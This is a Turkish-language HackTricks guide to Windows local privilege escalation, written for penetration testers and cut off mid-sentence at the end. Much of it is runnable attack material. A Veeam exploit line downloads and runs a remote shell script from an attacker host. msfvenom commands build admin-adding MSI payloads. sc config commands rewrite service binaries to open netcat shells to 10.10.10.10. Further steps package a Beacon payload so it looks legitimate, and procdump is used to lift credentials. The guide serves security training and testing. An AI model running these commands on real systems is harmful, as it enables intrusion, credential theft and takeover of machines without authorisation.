# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Başlangıç Windows Teorisi

### Access Tokens

**Windows Access Tokens'ın ne olduğunu bilmiyorsanız devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity levels'ın ne olduğunu bilmiyorsanız devam etmeden önce aşağıdaki sayfayı okumalısınız:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows'ta **sistemi enumerate etmenizi**, executable'ları çalıştırmanızı veya **aktivitelerinizi tespit etmelerini** engelleyebilecek çeşitli unsurlar vardır. Yetki yükseltme enumeration'ına başlamadan önce aşağıdaki **sayfayı** **okumalı** ve tüm bu **savunma** **mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess process'leri, AppInfo secure-path kontrolleri atlatıldığında prompt olmadan High IL'ye ulaşmak için abuse edilebilir. Özel UIAccess/Admin Protection bypass workflow'u için buraya bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, arbitrary SYSTEM registry write (RegPwn) için abuse edilebilir:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Güncel Windows build'leri ayrıca, ayrıcalıklı bir yerel NTLM authentication'ın yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı bir **SMB arbitrary-port** LPE yolu da sunmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows sürümünün bilinen herhangi bir vulnerability içerip içermediğini kontrol edin (uygulanan patch'leri de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve bir Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistem üzerinde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içinde barındırır)_

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin GitHub depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir credential/Juicy info var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları; yürütülen komutları, command invocation'ları ve script'lerin bölümlerini kapsayacak şekilde kaydedilir. Ancak yürütme ayrıntılarının tamamı ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini belirleyin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Script'in yürütülmesine ilişkin eksiksiz etkinlik ve tam içerik kaydı alınır; böylece her kod bloğu çalışırken belgelenir. Bu işlem, her etkinliğin adli incelemeler ve kötü amaçlı davranışların analiz edilmesi açısından değerli olan kapsamlı bir denetim izini korur. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block olaylarına ait günlük kayıtları Windows Olay Görüntüleyicisi'nde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http yerine http**S** kullanılarak istenmiyorsa sistemi ele geçirebilirsiniz.

İlk olarak cmd'de aşağıdaki komutu çalıştırarak ağın SSL kullanmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol edersiniz:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakini:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Şunlardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise,

**exploit edilebilir.** Son registry değeri `0` ise WSUS girdisi yok sayılır.

Bu vulnerability’leri exploit etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Bunlar, SSL olmayan WSUS trafiğine 'fake' update’ler enjekte etmek için kullanılan weaponized MiTM exploit script’leridir.

Araştırmayı buradan okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temel olarak bu, bug’ın exploit ettiği flaw’dur:

> Yerel user proxy’mizi değiştirme gücümüz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılan proxy’yi kullanıyorsa, kendi trafiğimizi intercept etmek ve asset’imizde elevated user olarak code çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)’ı lokal olarak çalıştırma gücüne sahibiz.
>
> Ayrıca WSUS service’i mevcut user’ın ayarlarını kullandığından, onun certificate store’unu da kullanır. WSUS hostname’i için self-signed certificate üretip bu certificate’ı mevcut user’ın certificate store’una eklersek hem HTTP hem de HTTPS WSUS trafiğini intercept edebiliriz. WSUS, certificate üzerinde trust-on-first-use tipi doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan certificate user tarafından trusted ise ve doğru hostname’e sahipse service tarafından kabul edilir.

Bu vulnerability’yi [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla exploit edebilirsiniz (liberated olduğunda).

## Third-Party Auto-Updaters ve Agent IPC (local privesc)

Birçok enterprise agent, localhost üzerinde bir IPC surface’i ve privileged bir update channel’ı açığa çıkarır. Enrollment bir attacker server’a yönlendirilebiliyorsa ve updater rogue root CA’lara veya weak signer check’lerine güveniyorsa, local user malicious bir MSI teslim edebilir ve SYSTEM service bu MSI’ı install eder. Genelleştirilmiş bir technique’i (Netskope stAgentSvc chain – CVE-2025-0309 temel alınarak) burada görebilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam B&R < `11.0.1.1261`, attacker-controlled mesajları işleyen ve **NT AUTHORITY\SYSTEM** olarak arbitrary command’lerin çalıştırılmasına izin veren bir localhost service’i **TCP/9401** üzerinde açığa çıkarır.

- **Recon**: listener’ı ve version’ı doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` gibi bir PoC’yi gerekli Veeam DLL’leriyle birlikte aynı directory’ye yerleştirin, ardından local socket üzerinden bir SYSTEM payload’ı trigger edin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak çalıştırır.
## KrbRelayUp

Belirli koşullar altında Windows **etki alanı** ortamlarında bir **yerel ayrıcalık yükseltme** güvenlik açığı mevcuttur. Bu koşullar arasında **LDAP signing uygulanmayan**, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına izin veren self-rights haklarına sahip olduğu ve kullanıcıların etki alanı içinde bilgisayar oluşturabildiği ortamlar bulunur. Bu **gereksinimlerin** varsayılan ayarlar kullanılarak karşılandığını belirtmek önemlidir.

**Exploit'i** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulun.

Saldırının akışı hakkında daha fazla bilgi için şu kaynağı inceleyin: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

Bu 2 kayıt defteri girdisi **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Bir meterpreter session'ınız varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Yetkileri yükseltmek üzere mevcut dizinin içinde bir Windows MSI binary'si oluşturmak için power-up'tan `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi görüntüleyen önceden derlenmiş bir MSI installer oluşturur (bu nedenle GIU erişimine ihtiyacınız olacaktır):
```
Write-UserAddMSI
```
Oluşturulan binary'yi privilege escalation gerçekleştirmek için çalıştırmanız yeterlidir.

### MSI Wrapper

Bu tools kullanarak bir MSI wrapper oluşturmayı öğrenmek için bu tutorial'ı okuyun. Yalnızca **command lines** **execute** etmek istiyorsanız "**.bat**" dosyasını wrap edebileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **new Windows EXE TCP payload** **generate** edin.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini belirleyin ve **Create**'e tıklayın.
- 4 adımdan 3. adıma (include edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce generate ettiğiniz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini vurgulayın ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
- **Author** ve **Manufacturer** gibi değiştirebileceğiniz ve installed app'in daha legitimate görünmesini sağlayabilecek başka properties de vardır.
- Projeye sağ tıklayın ve **View > Custom Actions** seçeneğini belirleyin.
- **Install**'a sağ tıklayın ve **Add Custom Action** seçeneğini belirleyin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz Beacon payload'ının execute edilmesini sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build** edin.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının **installation** işlemini **background**'da execute etmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti exploit etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Dedektörler

### Denetim Ayarları

Bu ayarlar nelerin **günlüğe kaydedildiğini** belirler; bu nedenle dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek açısından önemlidir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarının yönetimi** için tasarlanmıştır ve her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izinlere sahip kullanıcılara erişim verilir; bu kullanıcılar yetkilendirildikleri takdirde yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile birlikte Microsoft, Local Security Authority (LSA) için güvenliği artırılmış koruma sunarak güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engelledi** ve sistemi daha da güvenli hale getirdi.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard**, **Windows 10** ile tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır.| [**Credentials Guard hakkında daha fazla bilgi burada.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilgi çekici izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba aitseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıkları yükseltmek için bunların nasıl abuse edileceği hakkında buradan bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar** ve bunların nasıl abuse edileceği hakkında **bilgi edinmek** için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ana klasörler
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panonun içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Her şeyden önce, işlemleri listelerken **işlemin komut satırında parolaları kontrol edin**.\
**Çalışan bir binary'nin üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismar etmek için binary klasöründe yazma izinlerinizin olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Çalışıyor olabilecek [**electron/cef/chromium debuggers**'ları her zaman kontrol edin; bunları abuse ederek ayrıcalıkları yükseltebilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Süreçlerin binary'lerinin izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlem binary'lerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Bellekten Parola Madenciliği

sysinternals içindeki **procdump** aracını kullanarak çalışan bir işlemin memory dump'ını oluşturabilirsiniz. FTP gibi servisler **kimlik bilgilerini bellekte düz metin olarak tutar**; memory dump almayı ve kimlik bilgilerini okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın.

## Services

Service Triggers, belirli koşullar gerçekleştiğinde Windows'un bir service başlatmasını sağlar (named pipe/RPC endpoint etkinliği, ETW events, IP kullanılabilirliği, cihazın bağlanması, GPO refresh vb.). SERVICE_START hakları olmasa bile trigger'larını tetikleyerek privileged services'i çoğu zaman başlatabilirsiniz. Enumeration ve activation tekniklerini burada görebilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servis hakkında bilgi almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her servis için gereken yetki seviyesini kontrol etmek üzere _Sysinternals_ tarafından sağlanan **accesschk** binary'sinin bulundurulması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir servisi değiştirebilip değiştiremediğinin kontrol edilmesi önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Şunu kullanarak etkinleştirebilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışmak için SSDPSRV'ye bağlı olduğunu göz önünde bulundurun (XP SP1 için)**

**Bu soruna yönelik başka bir çözüm** şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Servis binary path'ini değiştirme**

"Authenticated users" grubunun bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir binary'sini değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi Yeniden Başlatma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve service configuration'larını değiştirme yeteneği kazandırır.
- **WRITE_OWNER**: Sahiplik edinmeye ve izinleri yeniden yapılandırmaya izin verir.
- **GENERIC_WRITE**: Service configuration'larını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Service configuration'larını değiştirme yeteneğini de devralır.

Bu vulnerability'nin detection ve exploitation işlemleri için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya privileged bir domain account olarak çalışıyorsa, ancak **low-privileged users service EXE'sini veya üst klasörünü değiştirebiliyorsa**, service çoğu zaman **binary'yi değiştirip service'i yeniden başlatarak** hijack edilebilir.

**Bir service tarafından çalıştırılan binary'yi değiştirebiliyor musunuz** veya binary'nin bulunduğu **folder** üzerinde **write permissions** var mı kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** (system32 içinde değil) kullanarak alabilir ve **icacls** ile izinlerinizi kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş tehlikeli ACL'leri, özellikle hizmet executable'ı veya onu içeren dizin üzerinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Pratik bir abuse akışı şöyledir:

1. `sc qc <service_name>` ile hizmet hesabını ve executable path'ini doğrulayın.
2. `icacls <path>` ile binary'nin yazılabilir olduğunu doğrulayın.
3. Hizmet binary'sini bir payload veya geçerli bir malicious service binary ile değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya reboot / service trigger gerçekleşmesini bekleyin).

Kullanışlı automated checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, başarısızlık durumunda yeniden başlatan bir eyleme sahip olup olmadığını veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** kullanıcılarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer sahiplerse, service tarafından yürütülen binary değiştirilebilir.

Service tarafından yürütülen binary'nin Path'ini değiştirmek için:
```bash
